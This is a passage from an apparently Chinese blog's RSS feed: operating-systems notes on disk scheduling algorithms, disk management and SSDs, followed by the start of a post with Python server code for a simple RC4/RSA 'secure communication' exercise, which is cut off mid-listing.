&lt;p&gt;优点：性能较好，平均寻道时间较短，不会产生饥饿现象&lt;br&gt;
缺点：①只有到达最边上的磁道时才能改变磁头移动方向，事实上，处理了最右边号磁道的访问请&lt;br&gt;
求之后就不需要再往右移动磁头了。&lt;/p&gt;
&lt;p&gt;②SCAN 算法对于各个位置磁道的响应频率不平均&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;LOOK 调度算法&lt;/p&gt;
&lt;p&gt;如果在磁头移动方向上已经没有别的请求，就可以立即改变磁头移动方向&lt;/p&gt;
&lt;p&gt;用来处理 SCAN 算法的第一个缺点&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;C-SCAN 调度算法&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;返回时直接快速移动至起始端而不处理任何请求&lt;/p&gt;
&lt;p&gt;C-SCAN 算法的主要缺点是只有到达最边上的磁道时才能改变磁头移动方向，并且磁头返回时不一定&lt;br&gt;
需要返回到最边缘的磁道上。C-LOOK 算法就是为了解决这个问题。如果磁头移动的方向上已经没有&lt;br&gt;
磁道访问请求了，就可以立即让磁头返回，并且磁头只需要返回到有磁道访问请求的位置即可。&lt;/p&gt;
&lt;p&gt;C-LOOK 调度算法，如果在磁头移动方向上已经没有别的请求，就可以立即改变磁头移动方向&lt;/p&gt;
&lt;p&gt;公平调度算法的整体思想是避免某请求长时间等待&lt;/p&gt;
&lt;h3 id=&#34;减小磁盘延迟时间的方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#减小磁盘延迟时间的方法&#34;&gt;#&lt;/a&gt; 减小磁盘延迟时间的方法&lt;/h3&gt;
&lt;p&gt;1、寻找时间（寻道时间）：启动磁臂、移动磁头所花的时间&lt;/p&gt;
&lt;p&gt;2、延迟时间：将目标扇区转到磁头下面所化的时间&lt;/p&gt;
&lt;p&gt;3、传输时间：读 / 写数据花费的时间&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1、采用交替编号策略&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;若采用交替编号的策略，即让逻辑上相邻的扇区在物理上有一定的间隔，可以使读取连续的逻辑扇区所需要的延迟时间更小。&lt;/p&gt;
&lt;p&gt;柱面号在盘面号之前，可以减少磁头移动消耗的时间&lt;/p&gt;
&lt;p&gt;2、&lt;strong&gt;错位命名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;方案一：若相邻的盘面相对位置相同处扇区编号相同&lt;/p&gt;
&lt;h3 id=&#34;磁盘的管理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#磁盘的管理&#34;&gt;#&lt;/a&gt; 磁盘的管理&lt;/h3&gt;
&lt;p&gt;1、磁盘初始化&lt;/p&gt;
&lt;p&gt;Step1: 进行低级格式化（物理格式化），将磁盘的各个磁道划分为扇区。&lt;/p&gt;
&lt;p&gt;Step2: 将磁盘分区，每个分区由若干柱面组成（即分为我们熟悉的 C 盘、D 盘、E 盘)&lt;br&gt;
 Step3: 进行逻辑格式化，创建文件系统。包括创建文件系统的根目录、初始化存储空间管理所用的数据结构（如位示图、 空闲分区表)&lt;/p&gt;
&lt;p&gt;2、引导块&lt;/p&gt;
&lt;p&gt;ROM 不可修改，ROM 中只存放很小的 “自举装入程序”&lt;/p&gt;
&lt;p&gt;3、坏块的管理&lt;/p&gt;
&lt;p&gt;对于简单的磁盘，可以在逻辑格式化时（建立文件系统时) 对整个磁盘进行坏块检查，标明哪些扇区是坏扇区，比如：在 FAT 表上标明。（在这种方式中，坏块对操作系统不透明)&lt;/p&gt;
&lt;p&gt;对于复杂的磁盘：磁盘控制器（磁盘设备内部的一个硬件部件) 会维护一个坏块链表，并管理备用扇区&lt;/p&gt;
&lt;h3 id=&#34;固态硬盘ssd&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#固态硬盘ssd&#34;&gt;#&lt;/a&gt; 固态硬盘 SSD&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230811154356502.png&#34; alt=&#34;image-20230811154356502&#34;&gt;&lt;/p&gt;
&lt;p&gt;借鉴&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzY4NTkxNjc5L2FydGljbGUvZGV0YWlscy8xMjg3MjUwMzI/b3BzX3JlcXVlc3RfbWlzYz0lN0IlMjJyZXF1ZXN0JTVGaWQlMjIlM0ElMjIxNjg5NzcwNzc4MTY4MDAyMjI4MjE3NjUlMjIlMkMlMjJzY20lMjIlM0ElMjIyMDE0MDcxMy4xMzAxMDIzMzQuLiUyMiU3RCZhbXA7cmVxdWVzdF9pZD0xNjg5NzcwNzc4MTY4MDAyMjI4MjE3NjUmYW1wO2Jpel9pZD0wJmFtcDt1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmFsbH50b3BfcG9zaXRpdmV+ZGVmYXVsdC0xLTEyODcyNTAzMi1udWxsLW51bGwuMTQyJTVFdjkwJTVFY2hhdHNlYXJjaCwyMzklNUV2MiU1RWluc2VydF9jaGF0Z3B0JmFtcDt1dG1fdGVybT1MaXR0bGVYaSZhbXA7c3BtPTEwMTguMjIyNi4zMDAxLjQxODc=&#34;&gt; 【LittleXi】操作系统_Little Xi 的博客 - CSDN 博客&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2023/07/24/%E7%AE%80%E5%8D%95%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</guid>
            <title>简单安全通信系统的设计与实现</title>
            <link>http://example.com/2023/07/24/%E7%AE%80%E5%8D%95%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</link>
            <pubDate>Mon, 24 Jul 2023 13:58:54 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;服务器端&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#服务器端&#34;&gt;#&lt;/a&gt; 服务器端&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; socket&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Crypto&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;PublicKey &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; RSA&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Crypto&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Cipher &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; PKCS1_OAEP&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Crypto&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Signature &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; pkcs1_15&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Crypto&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Hash &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; SHA256&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;rc4_decrypt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;key&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; ciphertext&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    S &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    j &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    out &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;bytearray&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 初始化 S 盒&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        j &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;j &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; key&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 生成密钥流并解密密文&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; j &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; char &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; ciphertext&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        j &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;j &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        out&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;char &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; out&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;server_address &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;127.0.0.1&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;server_port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8888&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 生成 RSA 密钥对&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; RSA&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;generate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2048&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;private_key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; key&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;export_key&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;public_key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; key&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;publickey&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;export_key&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;私钥:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; private_key&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;公钥:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; public_key&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 创建服务器套接字并绑定地址和端口&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;server_socket &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AF_INET&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SOCK_STREAM&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;server_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;bind&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;server_address&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; server_port&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;server_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;listen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;等待客户端连接...&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 等待客户端连接&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    client_socket&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; client_address &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; server_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;accept&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;客户端已连接:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; client_address&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 